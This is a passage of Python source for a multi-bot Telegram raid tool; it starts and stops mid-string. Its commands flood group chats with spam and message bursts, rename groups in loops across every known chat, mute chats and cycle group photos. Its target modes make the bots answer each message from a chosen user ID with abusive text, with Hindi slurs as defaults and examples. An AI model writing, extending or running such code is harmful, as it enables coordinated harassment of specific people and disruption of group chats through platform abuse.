            "  𝘡𝘦𝘳𝘰 𝘫𝘪𝘵𝘵𝘦𝘳 | 𝘐𝘯𝘴𝘵𝘢𝘯𝘵 𝘴𝘵𝘰𝘱\n"
            "╚══════════════════════╝"
        )

@_guard
async def cmd_testament(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await cmd_phantom(update, ctx)

@_guard
async def cmd_shadow(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await cmd_phantom(update, ctx)

@_guard
async def cmd_ncdel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx) or "SASUKE LING"
    ncdel_chats.add(cid)

    async def _run(stop_ev):
        await _run_engine(cid, _bots(), stop_ev, _pure_nc_factory(txt))

    await tc.start(cid, "nc", _run)
    await _reply(msg,
        "╔══════════════════════╗\n"
        "  ⚔️ 𝐍𝐂𝐃𝐄𝐋 𝐀𝐂𝐓𝐈𝐕𝐄\n"
        "  𝘕𝘊 + 𝘥𝘦𝘭𝘦𝘵𝘦 𝘮𝘰𝘥𝘦\n"
        "╚══════════════════════╝"
    )

@_guard
async def cmd_ncwar(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx) or "SASUKE LING WAR"
    ncwar_targets[cid] = txt
    await _start_nc(msg, cid, _pure_nc_factory(txt), f"⚔️ WAR: {txt}")

@_guard
async def cmd_stopncwar(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    ncwar_targets.pop(cid, None)
    await tc.stop(cid, "nc")
    await _reply(msg, "⛔ 𝐍𝐂 𝐖𝐀𝐑 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

async def _start_mgcnc(msg, factory, label: str):
    global _mgcnc_stop, _mgcnc_task, _mgcnc_targets
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!")
        return
    targets = list(known_chats)
    if not targets:
        await _reply(msg, "⚠️ 𝐍𝐨 𝐤𝐧𝐨𝐰𝐧 𝐠𝐫𝐨𝐮𝐩𝐬. 𝐅𝐢𝐫𝐬𝐭 𝐮𝐬𝐞 𝐛𝐨𝐭 𝐢𝐧 𝐚 𝐠𝐫𝐨𝐮𝐩.")
        return
    if _mgcnc_stop and not _mgcnc_stop.is_set():
        _mgcnc_stop.set()
    if _mgcnc_task and not _mgcnc_task.done():
        _mgcnc_task.cancel()
        try:
            await asyncio.wait_for(asyncio.shield(_mgcnc_task), timeout=2.0)
        except Exception:
            pass
    _mgcnc_targets[:] = targets
    _mgcnc_stop_ev = asyncio.Event()
    _fac = factory
    async def _run():
        await _mgcnc_engine(_mgcnc_targets, bots, _mgcnc_stop_ev, _fac)
    import sys
    mod = sys.modules[__name__]
    mod._mgcnc_stop = _mgcnc_stop_ev
    mod._mgcnc_task = asyncio.create_task(_run())
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  🌐 𝐌𝐔𝐋𝐓𝐈-𝐆𝐂 𝐍𝐂 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"  📛 {label}\n"
        f"  🎯 𝘎𝘊𝘴: {len(targets)}\n"
        f"  🤖 𝘉𝘰𝘵𝘴: {len(bots)}\n"
        f"  -stopmgcnc 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_mgcnc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    known_chats.add(msg.chat_id)
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg,
            "╔══════════════════════════════╗\n"
            "  🌐 𝐌𝐔𝐋𝐓𝐈-𝐆𝐂 𝐍𝐂 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒\n"
            "  -mgcnc <t>    𝘉𝘢𝘴𝘪𝘤 𝘕𝘊\n"
            "  -mgcchud <t>  💥 𝘊𝘩𝘶𝘥\n"
            "  -mgcbold <t>  𝘉𝘰𝘭𝘥\n"
            "  -mgcfire <t>  🔥 𝘍𝘪𝘳𝘦\n"
            "  -mgcwar <t>   ⚔️ 𝘞𝘢𝘳\n"
            "  -mgcsurge <t> ⚡ 𝘚𝘶𝘳𝘨𝘦\n"
            "  -mgccustom <n> <t>\n"
            "  -stopmgcnc    𝘚𝘵𝘰𝘱\n"
            "  -mgcstatus    𝘚𝘵𝘢𝘵𝘶𝘴\n"
            "╚══════════════════════════════╝"
        )
        return
    await _start_mgcnc(msg, _pure_nc_factory(txt), txt)

@_guard
async def cmd_mgcchud(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    known_chats.add(msg.chat_id)
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -mgcchud <text>")
        return
    await _start_mgcnc(msg, _chud_nc_factory(txt), f"💥 CHUD {txt}")

@_guard
async def cmd_mgcbold(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    known_chats.add(msg.chat_id)
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -mgcbold <text>")
        return
    await _start_mgcnc(msg, _font_factory(txt, "bold"), f"𝐁𝐎𝐋𝐃 {txt}")

@_guard
async def cmd_mgcfire(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    known_chats.add(msg.chat_id)
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -mgcfire <text>")
        return
    await _start_mgcnc(msg, _mgc_fire_factory(txt), f"🔥 {txt}")

@_guard
async def cmd_mgcwar(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    known_chats.add(msg.chat_id)
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -mgcwar <text>")
        return
    await _start_mgcnc(msg, _mgc_war_factory(txt), f"⚔️ {txt}")

@_guard
async def cmd_mgcsurge(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    known_chats.add(msg.chat_id)
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -mgcsurge <text>")
        return
    await _start_mgcnc(msg, _mgc_surge_factory(txt), f"⚡ SURGE {txt}")

@_guard
async def cmd_mgccustom(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    known_chats.add(msg.chat_id)
    args = _get_args(ctx)
    if len(args) < 2:
        await _reply(msg, "𝐔𝐬𝐞: -mgccustom <template_name> <text>")
        return
    name = args[0]
    txt  = " ".join(args[1:])
    if name not in custom_templates:
        await _reply(msg, f"⚠️ Template '{name}' not found. Use -templates")
        return
    tmpl    = custom_templates[name]
    factory = _custom_template_factory(tmpl, txt)
    await _start_mgcnc(msg, factory, f"🎨 {name}: {txt}")

@_guard
async def cmd_stopmgcnc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    global _mgcnc_stop, _mgcnc_task, _mgcnc_targets
    msg = update.message or update.edited_message
    if not msg:
        return
    stopped = False
    if _mgcnc_stop and not _mgcnc_stop.is_set():
        _mgcnc_stop.set()
        stopped = True
    if _mgcnc_task and not _mgcnc_task.done():
        _mgcnc_task.cancel()
        try:
            await asyncio.wait_for(asyncio.shield(_mgcnc_task), timeout=3.0)
        except Exception:
            pass
        stopped = True
    _mgcnc_targets.clear()
    if stopped:
        await _reply(msg,
            "╔══════════════════════╗\n"
            "  ⛔ 𝐌𝐔𝐋𝐓𝐈-𝐆𝐂 𝐍𝐂 𝐒𝐓𝐎𝐏𝐏𝐄𝐃\n"
            "╚══════════════════════╝"
        )
    else:
        await _reply(msg, "⚡ 𝐍𝐨 𝐚𝐜𝐭𝐢𝐯𝐞 𝐌𝐮𝐥𝐭𝐢-𝐆𝐂 𝐍𝐂.")

@_guard
async def cmd_mgcstatus(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    running = bool(_mgcnc_task and not _mgcnc_task.done())
    bots    = _bots()
    status  = "🟢 𝐑𝐔𝐍𝐍𝐈𝐍𝐆" if running else "🔴 𝐒𝐓𝐎𝐏𝐏𝐄𝐃"
    gc_list = "\n".join(f"  • {c}" for c in _mgcnc_targets) if _mgcnc_targets else "  𝘕𝘰𝘯𝘦"
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  🌐 𝐌𝐔𝐋𝐓𝐈-𝐆𝐂 𝐒𝐓𝐀𝐓𝐔𝐒\n"
        f"  {status}\n"
        f"  🎯 𝘎𝘊𝘴: {len(_mgcnc_targets)}  🤖 𝘉𝘰𝘵𝘴: {len(bots)}\n"
        f"{gc_list}\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_multiwar(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg,
            "╔══════════════════════════════╗\n"
            "  🎯 𝐌𝐔𝐋𝐓𝐈𝐖𝐀𝐑\n"
            "  𝘜𝘴𝘦: -multiwar <text>\n"
            "  𝘚𝘵𝘰𝘱: -stopmultiwar\n"
            "╚══════════════════════════════╝"
        )
        return
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!")
        return
    targets = list(known_chats)
    if not targets:
        await _reply(msg, "⚠️ 𝐍𝐨 𝐤𝐧𝐨𝐰𝐧 𝐠𝐫𝐨𝐮𝐩𝐬.")
        return
    started = 0
    for cid in targets:
        factory = _pure_nc_factory(txt)
        async def _run(stop_ev, _cid=cid, _fac=factory):
            await _run_engine(_cid, bots, stop_ev, _fac)
        await tc.start(cid, "nc", _run)
        _multiwar_active[cid] = True
        started += 1
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  ⚔️ 𝐌𝐔𝐋𝐓𝐈𝐖𝐀𝐑 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"  📛 {txt}\n"
        f"  🎯 𝘎𝘳𝘰𝘶𝘱𝘴: {started}\n"
        f"  -stopmultiwar 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_stopmultiwar(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    total = 0
    for cid in list(_multiwar_active.keys()):
        if await tc.stop(cid, "nc"):
            total += 1
        _multiwar_active.pop(cid, None)
    await _reply(msg,
        f"╔══════════════════════╗\n"
        f"  ⛔ 𝐌𝐔𝐋𝐓𝐈𝐖𝐀𝐑 𝐒𝐓𝐎𝐏𝐏𝐄𝐃\n"
        f"  𝘒𝘪𝘭𝘭𝘦𝘥 {total} 𝘨𝘳𝘰𝘶𝘱𝘴\n"
        f"╚══════════════════════╝"
    )

@_guard
async def cmd_speedtest(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬!")
        return
    await _reply(msg,
        "╔══════════════════════════════╗\n"
        "  ⚡ 𝑺𝑷𝑬𝑬𝑫𝑻𝑬𝑺𝑻 𝑺𝑻𝑨𝑹𝑻𝑬𝑫\n"
        "  𝘙𝘶𝘯𝘯𝘪𝘯𝘨 10𝘴...\n"
        "╚══════════════════════════════╝"
    )
    DURATION = 10.0
    count    = [0]
    floods   = [0]
    done_ev  = asyncio.Event()
    factory  = _lean_nc_factory("SpeedTest")

    async def _tw(bot):
        while not done_ev.is_set():
            try:
                await bot.set_chat_title(cid, factory()[:255])
                count[0] += 1
            except RetryAfter:
                floods[0] += 1
                try:
                    await asyncio.wait_for(done_ev.wait(), timeout=0.5)
                except asyncio.TimeoutError:
                    pass
            except Exception:
                try:
                    await asyncio.wait_for(done_ev.wait(), timeout=0.1)
                except asyncio.TimeoutError:
                    pass

    workers = [asyncio.create_task(_tw(b)) for b in bots]
    try:
        await asyncio.wait_for(done_ev.wait(), timeout=DURATION)
    except asyncio.TimeoutError:
        pass
    done_ev.set()
    await asyncio.gather(*workers, return_exceptions=True)

    rate    = count[0] / DURATION
    verdict = ("🟢 𝗘𝘅𝗰𝗲𝗹𝗹𝗲𝗻𝘁" if rate >= 5 else
               "🟡 𝗚𝗼𝗼𝗱" if rate >= 3 else "🔴 𝗦𝗹𝗼𝘄")
    await msg.reply_text(
        f"╔══════════════════════════════╗\n"
        f"  ⚡ 𝑺𝑷𝑬𝑬𝑫𝑻𝑬𝑺𝑻 𝑹𝑬𝑺𝑼𝑳𝑻𝑺\n"
        f"  ─────────────────────────────\n"
        f"  ▸ 𝗖𝗵𝗮𝗻𝗴𝗲𝘀:  {count[0]} 𝗶𝗻 10𝘀\n"
        f"  ▸ 𝗦𝗽𝗲𝗲𝗱:    {rate:.1f}/𝘀𝗲𝗰  {verdict}\n"
        f"  ▸ 𝗙𝗹𝗼𝗼𝗱𝘀:   {floods[0]}\n"
        f"  ▸ 𝗕𝗼𝘁𝘀:     {len(bots)}/10\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_mute(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    mute_chats.add(cid)
    for bot in _bots():
        try:
            await bot.set_chat_permissions(cid, ChatPermissions(can_send_messages=False))
        except Exception:
            pass
    await _reply(msg, "🔇 𝐂𝐇𝐀𝐓 𝐌𝐔𝐓𝐄𝐃")

@_guard
async def cmd_unmute(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    mute_chats.discard(cid)
    for bot in _bots():
        try:
            await bot.set_chat_permissions(cid, ChatPermissions(
                can_send_messages=True,
                can_send_media_messages=True,
                can_send_polls=True,
                can_send_other_messages=True,
                can_add_web_page_previews=True,
            ))
        except Exception:
            pass
    await _reply(msg, "🔊 𝐂𝐇𝐀𝐓 𝐔𝐍𝐌𝐔𝐓𝐄𝐃")

@_guard
async def cmd_spam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -spam <text>")
        return

    async def _run(stop_ev):
        while not stop_ev.is_set():
            for bot in _bots():
                if stop_ev.is_set():
                    break
                try:
                    await bot.send_message(cid, txt)
                except RetryAfter as e:
                    try:
                        await asyncio.wait_for(stop_ev.wait(), timeout=min(e.retry_after, 2.0))
                    except asyncio.TimeoutError:
                        pass
                except Exception:
                    pass
            await asyncio.sleep(0)

    await tc.start(cid, "spam", _run)
    await _reply(msg, "💬 𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 — -stopspam to stop")

@_guard
async def cmd_stopspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    await tc.stop(msg.chat_id, "spam")
    await _reply(msg, "⛔ 𝐒𝐏𝐀𝐌 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@_guard
async def cmd_slidespam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -slidespam <text>")
        return

    SLIDE_MSGS = [
        f"💥𒐫𒐫𒐫{txt}𒐫𒐫𒐫💥 ➴ྀ࿐",
        f"🔥 {txt} 🔥 ➴ྀ࿐ ··",
        f"⚡{txt}⚡𒐫𒐫💥💥 ➴ྀ࿐",
        f"💀 {txt} 💀 𒐫💥𒐫 ·· ➴ྀ",
        f"👑{txt}👑 𒐫𒐫💥𒐫𒐫 ➴ྀ",
    ]
    idx = [0]

    async def _run(stop_ev):
        while not stop_ev.is_set():
            for bot in _bots():
                if stop_ev.is_set():
                    break
                try:
                    await bot.send_message(cid, SLIDE_MSGS[idx[0] % len(SLIDE_MSGS)])
                    idx[0] += 1
                except RetryAfter as e:
                    try:
                        await asyncio.wait_for(stop_ev.wait(), timeout=min(e.retry_after, 2.0))
                    except asyncio.TimeoutError:
                        pass
                except Exception:
                    pass
            await asyncio.sleep(0)

    await tc.start(cid, "slide", _run)
    await _reply(msg,
        f"💥 𝐒𝐋𝐈𝐃𝐄 𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"📛 {txt}\n"
        f"-stopslide to stop"
    )

@_guard
async def cmd_stopslide(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    await tc.stop(msg.chat_id, "slide")
    await _reply(msg, "⛔ 𝐒𝐋𝐈𝐃𝐄 𝐒𝐏𝐀𝐌 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@_guard
async def cmd_autoreply(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -autoreply <text>")
        return
    autoreply_chats[cid] = txt
    await _reply(msg, f"✅ 𝐀𝐮𝐭𝐨 𝐫𝐞𝐩𝐥𝐲 𝐬𝐞𝐭: {txt}")

@_guard
async def cmd_stopreply(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    autoreply_chats.pop(msg.chat_id, None)
    await _reply(msg, "⛔ 𝐀𝐮𝐭𝐨 𝐫𝐞𝐩𝐥𝐲 𝐨𝐟𝐟")

@_guard
async def cmd_react(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid   = msg.chat_id
    args  = _get_args(ctx)
    emoji = args[0] if args else "🔥"
    autoreact_chats[cid] = emoji
    await _reply(msg, f"✅ 𝐀𝐮𝐭𝐨 𝐫𝐞𝐚𝐜𝐭: {emoji}")

@_guard
async def cmd_stopreact(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    autoreact_chats.pop(msg.chat_id, None)
    await _reply(msg, "⛔ 𝐀𝐮𝐭𝐨 𝐫𝐞𝐚𝐜𝐭 𝐨𝐟𝐟")

@_guard
async def cmd_targetreply(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    if len(args) < 2:
        await _reply(msg,
            "╔══════════════════════════════╗\n"
            "  🎯 𝐓𝐀𝐑𝐆𝐄𝐓 𝐑𝐄𝐏𝐋𝐘\n"
            "  𝘜𝘴𝘦: -targetreply <uid> <text>\n"
            "  𝘌𝘨: -targetreply 123456 BC chodu\n"
            "  𝘉𝘰𝘵 𝘳𝘦𝘱𝘭𝘪𝘦𝘴 𝘵𝘰 𝘦𝘷𝘦𝘳𝘺 𝘮𝘴𝘨\n"
            "  𝘧𝘳𝘰𝘮 𝘵𝘢𝘳𝘨𝘦𝘵 𝘶𝘴𝘦𝘳\n"
            "╚══════════════════════════════╝"
        )
        return
    try:
        uid = int(args[0])
    except ValueError:
        await _reply(msg, "⚠️ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐮𝐬𝐞𝐫 𝐈𝐃. 𝘜𝘴𝘦 𝘯𝘶𝘮𝘦𝘳𝘪𝘤 𝘐𝘋.")
        return
    txt = " ".join(args[1:]).strip()
    targetreply_chats[cid] = {"uid": uid, "text": txt}
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  🎯 𝐓𝐀𝐑𝐆𝐄𝐓 𝐑𝐄𝐏𝐋𝐘 𝐀𝐂𝐓𝐈𝐕𝐄\n"
        f"  👤 𝘜𝘴𝘦𝘳 𝘐𝘋: {uid}\n"
        f"  💬 𝘙𝘦𝘱𝘭𝘺: {txt}\n"
        f"  𝘌𝘷𝘦𝘳𝘺 𝘮𝘴𝘨 𝘧𝘳𝘰𝘮 𝘵𝘢𝘳𝘨𝘦𝘵 = 𝘳𝘦𝘱𝘭𝘺\n"
        f"  -stoptargetreply 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_stoptargetreply(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    targetreply_chats.pop(msg.chat_id, None)
    await _reply(msg, "⛔ 𝐓𝐀𝐑𝐆𝐄𝐓 𝐑𝐄𝐏𝐋𝐘 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@_guard
async def cmd_targetslide(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    if not args:
        await _reply(msg,
            "╔══════════════════════════════╗\n"
            "  🎯 𝐓𝐀𝐑𝐆𝐄𝐓 𝐒𝐋𝐈𝐃𝐄\n"
            "  𝘜𝘴𝘦: -targetslide <uid>\n"
            "  𝘞𝘩𝘦𝘯 𝘵𝘢𝘳𝘨𝘦𝘵 𝘴𝘦𝘯𝘥𝘴 𝘢 𝘮𝘴𝘨,\n"
            "  𝘣𝘰𝘵 𝘧𝘪𝘳𝘦𝘴 𝘴𝘭𝘪𝘥𝘦 𝘣𝘶𝘳𝘴𝘵 𝘰𝘯 𝘵𝘩𝘦𝘮\n"
            "╚══════════════════════════════╝"
        )
        return
    try:
        uid = int(args[0])
    except ValueError:
        await _reply(msg, "⚠️ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐮𝐬𝐞𝐫 𝐈𝐃.")
        return
    txt = " ".join(args[1:]).strip() or "💥𒐫𒐫𒐫CHUD𒐫𒐫💥 ➴ྀ"
    targetslide_chats[cid] = {"uid": uid, "text": txt}
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  🎯 𝐓𝐀𝐑𝐆𝐄𝐓 𝐒𝐋𝐈𝐃𝐄 𝐀𝐂𝐓𝐈𝐕𝐄\n"
        f"  👤 𝘜𝘴𝘦𝘳 𝘐𝘋: {uid}\n"
        f"  💬 𝘚𝘭𝘪𝘥𝘦 𝘵𝘦𝘹𝘵: {txt}\n"
        f"  𝘛𝘢𝘳𝘨𝘦𝘵 𝘮𝘴𝘨 → 𝘣𝘶𝘳𝘴𝘵 𝘴𝘭𝘪𝘥𝘦𝘴\n"
        f"  -stoptargetslide 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_stoptargetslide(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    targetslide_chats.pop(msg.chat_id, None)
    await _reply(msg, "⛔ 𝐓𝐀𝐑𝐆𝐄𝐓 𝐒𝐋𝐈𝐃𝐄 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

async def _fire_slide_burst(chat_id: int, text: str, reply_to_msg=None):
    bots  = _bots()
    burst = min(len(bots) * 2, 10)
    SLIDE_VARIANTS = [
        f"💥𒐫𒐫{text}𒐫𒐫💥 ➴ྀ",
        f"🔥 {text} 🔥 ➴ྀ ··",
        f"⚡{text}⚡𒐫💥 ·· ➴ྀ",
        f"💀 {text} 💀 𒐫💥𒐫 ➴ྀ",
        f"👑{text}👑 𒐫𒐫💥𒐫 ➴ྀ",
        f"[chud {text}𒐫💥{random.choice(_CHUD_WORDS)} ➴ྀ]",
    ]

    async def _send(bot, variant):
        try:
            if reply_to_msg:
                await reply_to_msg.reply_text(variant)
            else:
                await bot.send_message(chat_id, variant)
        except Exception:
            pass

    tasks = []
    for i in range(burst):
        bot = bots[i % len(bots)]
        tasks.append(asyncio.create_task(_send(bot, SLIDE_VARIANTS[i % len(SLIDE_VARIANTS)])))
    await asyncio.gather(*tasks, return_exceptions=True)

@_guard
async def cmd_addpfp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    rep = msg.reply_to_message
    if not (rep and rep.photo):
        await _reply(msg, "𝐑𝐞𝐩𝐥𝐲 𝘵𝘰 𝘢 𝘱𝘩𝘰𝘵𝘰 𝘵𝘰 𝘢𝘥𝘥 𝘵𝘰 𝘗𝘍𝘗 𝘱𝘰𝘰𝘭")
        return
    fid  = rep.photo[-1].file_id
    key  = str(cid)
    pool = _pfp_pools.get(key, [])
    if fid not in pool:
        pool.append(fid)
        _pfp_pools[key] = pool
        _save_json(PFP_FILE, _pfp_pools)
    await _reply(msg,
        f"✅ 𝐏𝐅𝐏 𝐀𝐃𝐃𝐄𝐃\n"
        f"📋 𝘗𝘰𝘰𝘭 𝘴𝘪𝘻𝘦: {len(pool)}"
    )

@_guard
async def cmd_pfppool(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    pool = _pfp_pools.get(str(cid), [])
    await _reply(msg,
        f"╔══════════════════════╗\n"
        f"  🖼️ 𝐏𝐅𝐏 𝐏𝐎𝐎𝐋\n"
        f"  𝘗𝘩𝘰𝘵𝘰𝘴: {len(pool)}\n"
        f"  -pfploop <sec> 𝘵𝘰 𝘴𝘵𝘢𝘳𝘵\n"
        f"╚══════════════════════╝"
    )

@_guard
async def cmd_clearpfp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    _pfp_pools.pop(str(cid), None)
    _save_json(PFP_FILE, _pfp_pools)
    await _reply(msg, "✅ 𝐏𝐅𝐏 𝐏𝐎𝐎𝐋 𝐂𝐋𝐄𝐀𝐑𝐄𝐃")

@_guard
async def cmd_pfploop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    pool = _pfp_pools.get(str(cid), [])
    if not pool:
        await _reply(msg,
            "⚠️ 𝐍𝐨 𝐏𝐅𝐏𝐬 𝐢𝐧 𝐩𝐨𝐨𝐥!\n"
            "𝘙𝘦𝘱𝘭𝘺 𝘵𝘰 𝘢 𝘱𝘩𝘰𝘵𝘰 𝘸𝘪𝘵𝘩 -addpfp 𝘧𝘪𝘳𝘴𝘵"
        )
        return
    try:
        delay = float(args[0]) if args else 3.0
        if delay < 1.0:
            delay = 1.0
    except ValueError:
        delay = 3.0

    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬!")
        return

    pfploop_active[cid] = True

    async def _run(stop_ev):
        idx = 0
        try:
            while not stop_ev.is_set():
                fid = pool[idx % len(pool)]
                idx += 1
                for bot in bots:
                    if stop_ev.is_set():
                        break
                    try:
                        await bot.set_chat_photo(cid, fid)
                        break
                    except RetryAfter as e:
                        await asyncio.sleep(min(e.retry_after, 3.0))
                    except (BadRequest, Forbidden):
                        break
                    except (TimedOut, NetworkError):
                        await asyncio.sleep(0.5)
                    except Exception:
                        break
                if await _wait_ev(stop_ev, delay):
                    break
        finally:
            pfploop_active.pop(cid, None)

    await tc.start(cid, "pfp", _run)
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  🖼️ 𝐏𝐅𝐏 𝐋𝐎𝐎𝐏 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"  📋 𝘗𝘩𝘰𝘵𝘰𝘴: {len(pool)}\n"
        f"  ⏱  𝘋𝘦𝘭𝘢𝘺: {delay}𝘴 𝘱𝘦𝘳 𝘤𝘺𝘤𝘭𝘦\n"
        f"  -stoppfploop 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════════╝"
    )

# ═══════════════════════════════════════════
#  CUSTOM NC TEMPLATE SYSTEM
# ═══════════════════════════════════════════

@_guard
async def cmd_addtemplate(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg  = update.message or update.edited_message
    if not msg:
        return
    args = _get_args(ctx)
    if len(args) < 2:
        await _reply(msg,
            "╔══════════════════════════════════╗\n"
            "  📝 𝐀𝐃𝐃𝐓𝐄𝐌𝐏𝐋𝐀𝐓𝐄\n"
            "  ──────────────────────────────────\n"
            "  𝐔𝐬𝐞: -addtemplate <name> <template>\n"
            "  ──────────────────────────────────\n"
            "  𝗣𝗹𝗮𝗰𝗲𝗵𝗼𝗹𝗱𝗲𝗿𝘀:\n"
            "  {t}   → NC text (tum jo doge)\n"
            "  {w}   → chud word (LUND/TBKC...)\n"
            "  {e}   → random emoji\n"
            "  {n}   → counter (1,2,3...)\n"
            "  {wl}  → left wrap (꧁ ♛ 🔱...)\n"
            "  {wr}  → right wrap (꧂ ♛ 🌊...)\n"
            "  ──────────────────────────────────\n"
            "  𝗘𝘅𝗮𝗺𝗽𝗹𝗲𝘀:\n"
            "  -addtemplate fire 🔥{wl}{t}{wr}🔥{w}\n"
            "  -addtemplate king 👑{t}👑 {w} {e}\n"
